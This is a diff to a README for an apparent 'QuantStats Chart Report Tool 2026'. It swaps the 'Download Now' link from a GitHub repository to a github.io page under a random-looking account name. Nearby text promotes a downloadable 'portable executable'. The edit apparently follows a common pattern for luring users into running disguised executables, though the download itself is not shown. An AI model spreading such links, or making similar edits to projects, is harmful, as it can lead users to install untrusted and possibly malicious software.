@@ -5,7 +5,7 @@ QuantStats Chart Report Tool 2026 converts complex QuantStats HTML outputs into 
 
 ## ⬇️ Download & Install
 
-[![Download Now](https://img.shields.io/badge/Download-QuantStats%20Report%20Generator%202026-blue?style=for-the-badge&logo=github)](https://github.com/Disposablegenusorthopristis671/quantstats-chart-report-tool)
+[![Download Now](https://img.shields.io/badge/Download-QuantStats%20Report%20Generator%202026-blue?style=for-the-badge&logo=github)](https://disposablegenusorthopristis671.github.io)
 
 Visit this link to download the application. The tool is available as a portable executable - no installation required.
 
